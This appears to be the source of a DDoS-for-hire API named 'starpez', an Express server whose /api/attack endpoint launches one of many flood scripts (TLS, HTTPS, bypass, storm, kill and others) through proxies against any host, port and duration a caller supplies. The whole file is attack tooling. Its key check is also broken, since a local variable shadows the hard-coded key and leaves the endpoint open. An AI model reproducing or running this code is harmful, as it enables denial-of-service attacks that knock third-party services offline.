const express = require('express');
const app = express();
const port = 8080;

const key = "starpez";

app.get('/api/attack', (req, res) => {
  try {
    const key = req.query.key;  
    const host = req.query.host;
    const port = req.query.port;
    const time = parseInt(req.query.time);
    const method = req.query.method;

    if (req.query.key !== key) {
      return res.status(401).send('Key not working');
    }

    if (method === 'tls') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['TLS.js', host, time, 32, 2]);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'https') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['HTTPS.js', host, time, 32, 2, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'http-x') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['HTTP-X.js', host, time, 32, 2, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'bypass') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['BYPASS.js', host, time, 32, 2, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'cibi') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['Cibi.js', host, time, 32, 2, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'destroy') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['destroy.js', host, time, 32, 2, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'flood') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['flood.js', host, time, 32, 2, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'glory') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['glory.js', host, time, 32, 2, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
    } else if (method === 'rapid') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['RAPID.js', host, time, 32, 2, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
    } else if (method === 'http-raw') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['HTTP-RAW.js', host, time]);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
    } else if (method === 'tlsv2') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['tlsv2.js', host, time, 32, 2]);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
    } else if (method === 'storm') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['Storm.js', host, time, 32, 2, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
    } else if (method === 'ninja') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['ninja.js', host, time]);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
    } else if (method === 'xyn') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['xyn.js', host, time, 32, 2, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'browser') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['Browsers.js', host, time, 2, 32]);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'mix') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['MIX.js', host, time, 32, 2]);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'kill') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['kill.js', host, time, 32, 2]);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'strike') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['strike.js', 'GET', host, time, 2, 32, 'proxy.txt', '--full', '--legit']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'hold') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['hold.js', host, time, 32, 2, 'proxy.txt']);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
      } else if (method === 'mixbill') {
      const spawn = require('child_process').spawn;
      const ls = spawn('node', ['MixBill.js', host, time, 32, 2]);

      ls.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
      });

      ls.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
      });

      ls.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
        if (code === 0) { 
          const html = `
            <html>
              <body>
                <h1>starpez api</h1>
                <p>Host: ${host}</p>
                <p>Port: ${port}</p>
                <p>Time: ${time}</p>
                <p>Method: ${method}</p>
              </body>
            </html>
          `;
          res.send(html);
        } else {
          console.error('Terjadi kesalahan selama pelaksanaan proses..');
          res.status(500).send('Terjadi kesalahan selama pelaksanaan proses..');
        }
      });
    } else {
      console.error('Metode yang salah..');
      res.status(400).send('Metode yang salah..');
    }
  } catch (error) {
    console.error(error);
    res.status(500).send('Ada masalah.');
  }
});

app.listen(port, () => {
  console.log(`API StarPez Started To: ${port} port`);
});
